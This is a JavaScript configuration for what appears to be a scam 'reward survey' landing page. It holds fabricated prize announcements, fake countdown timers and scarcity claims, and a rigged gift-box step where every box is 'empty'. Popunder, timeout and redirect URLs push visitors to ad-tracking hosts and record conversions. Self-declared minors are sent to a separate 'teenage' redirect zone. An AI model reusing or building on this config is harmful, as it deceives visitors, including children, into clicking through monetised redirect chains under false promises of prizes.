window.surveyData = {
    adex: 1,
    adex_alert_urll: 'https://lehtymns.com/4453095/?var={zone}&ymid={request_var}',
    adex_warning_urll: 'https://lehtymns.com/4453095/?var={zone}&ymid={request_var}',
    ipp_zonee: 4599387,
    ipp_zone_teenagee: 4599749,
    ipp_zone_reversee: 4453914,
    comment: 'Sweep New 6 EN',
    autoexitt: 4254940,
    push_zonee: 4254933,
    reverse_zonee: 4254937,
    popunder_urll: 'https://lehtymns.com/4254936/?var={zone}&ymid={request_var}',
    lead: {
        not_unique: {
            redirect_urll: 'https://lehtymns.com/4254934/?var={zone}&ymid={request_var}',
        },
    },
    title: 'Dear user',
    subtitle: ['We offer you a chance to receive a reward from our sponsors!', 'To receive your reward, simply complete our short and anonymous survey.', 'You only have <b>{min} Minute and {sec} Seconds</b>, to participate.', ],
    logo_text: 'Congratulations! <br> <br> Promotional Contest on <b>{date:today}</b>',
    alert: {
        welcome: `<h1>Congratulations!</h1>
        <p>Today <b>{date:today}</b> you have been randomly selected to participate in this quiz. It will only take you a minute and you will have the chance to receive one prize.</p>
        <img src='source/tokens10k.png'>
        <p>Every week we randomly select 10 users. Only 10 lucky users who live in <b>{countryName}</b> have a chance to receive a reward!</p>
        <p>You only have <span><b>{min} Minute and {sec} Seconds</b></span>, to participate.
        <br>
        Hurry up! There is a limited number of prizes!</p>`,
        welcomebtn: 'Continue',
        empty: 'Sorry, this gift box is empty! You still have a few tries left. Good luck!',
        final: '',
    },
    main: {
        type: 'question',
        text: 'What is your gender?',
        options: [{
            type: 'button',
            text: 'Man',
            audience_id: [61427, 60623],
            action: {
                goto: 'step2',
            },
        }, {
            type: 'button',
            text: 'Woman',
            audience_id: [61428, 60624],
            action: {
                goto: 'step2',
            },
        }, ],
    },
    step2: {
        type: 'question',
        text: 'How old are you?',
        options: [{
            type: 'button',
            text: 'less than 18 years',
            audience_id: [61421, 62387, 60625],
            action: {
                redirect_ipp: 'teenage',
                redirect_urll: 'https://ak.hetaruvg.com/4/4599793/?var={zone}&ymid={request_var}',
                popunder_urll: 'https://lehtymns.com/4370735/?var={zone}&ymid={request_var}',
            },
        }, {
            type: 'button',
            text: '18-29 years',
            audience_id: [62180, 62377, 68427, 78100, 62377, 62382, 68423, 78096],
            action: {
                goto: 'step3',
            },
        }, {
            type: 'button',
            text: '30-49 years',
            audience_id: [62181, 62380, 68425, 78097, 62383, 78101],
            action: {
                goto: 'step3',
            },
        }, {
            type: 'button',
            text: '50-80 years',
            audience_id: [62182, 62381, 68426, 78098, 62384, 78102],
            action: {
                goto: 'step3',
            },
        }, ],
    },
    step3: {
        type: 'question',
        text: 'How often do you shop online?',
        options: [{
            type: 'button',
            text: 'Every day',
            audience_id: 0,
            action: {
                goto: 'step4',
            },
        }, {
            type: 'button',
            text: 'Often',
            audience_id: 0,
            action: {
                goto: 'step4',
            },
        }, {
            type: 'button',
            text: 'Rarely',
            audience_id: 0,
            action: {
                goto: 'step4',
            },
        }, {
            type: 'button',
            text: 'Never',
            audience_id: 0,
            action: {
                goto: 'step4',
            },
        }, ],
    },
    step4: {
        type: 'question',
        text: 'Have you ever used gift cards/vouchers for your purchases?',
        options: [{
            type: 'button',
            text: 'Yes',
            audience_id: 0,
            action: {
                goto: 'step5',
            },
        }, {
            type: 'button',
            text: 'No',
            audience_id: 0,
            action: {
                goto: 'step5',
            },
        }, ],
    },
    step5: {
        type: 'question',
        text: 'Are you interested in getting the biggest discounts and gifts?',
        options: [{
            type: 'button',
            text: 'Yes',
            audience_id: 0,
            action: {
                goto: 'step6',
            },
        }, {
            type: 'button',
            text: 'No',
            audience_id: 0,
            action: {
                goto: 'step6',
            },
        }, ],
    },
    step6: {
        type: 'question',
        text: 'What would you rather prefer?',
        options: [{
            type: 'button',
            text: 'A gift card',
            audience_id: 0,
            action: {
                goto: 'final',
            },
        }, {
            type: 'button',
            text: 'One-time discount',
            audience_id: 0,
            action: {
                goto: 'final',
            },
        }, {
            type: 'button',
            text: 'A discount card',
            audience_id: 0,
            action: {
                goto: 'final',
            },
        }, ],
    },
    final: {
        type: 'thank_you',
        boxes: 1,
        timeout: 40,
        timeout_urll: 'https://ak.hetaruvg.com/4/4599756/?var={zone}&ymid={request_var}',
        timeout_conversion: 1,
        content: `<div class="final">
                    <div class="final__step1">
                        <p>Thank you for taking our quiz.</p>
                        <p>Now you have a chance to receive a reward.</p>
                        <p>All you have to do is choose the right gift box.</p>
                    </div>
                    <div class="final__step2">
                        <p>Oops!</p>
                        <p>The boxes are empty.</p>
                        <p>You still have a chance to receive a reward from our partners.</p>
                        <p>This offer is only available for the next 7 minutes!</p>
                    </div>
                    <div class="instructions">
                        <h2 class="instructions__header">Find a reward!</h2>
                        <div class="instructions__text">
                            <span class=bounce>&darr;</span>
                            <h3 class="instructions__text-1">All you have to do is choose <b>the correct gift box</b>.</h3>
                            <h3 class="instructions__text-2">Click the CONTINUE button and complete the final steps to get a chance to receive a reward!</h3>
                            <span class=bounce>&darr;</span>
                        </div>
                    </div>
                </div>`,
        progress_title: 'Estimating the results...',
        progress_texts: ['Wait... Checking answers', 'Wait... Counting your score'],
        progress_content: '',
        options: [{
            type: 'button',
            text: 'CONTINUE',
            audience_id: 61426,
            action: {
                conversion: 1,
                redirect_url: 'https://ak.hetaruvg.com/4/4599756/?var={zone}&ymid={request_var}',
            },
        }, ],
    },
};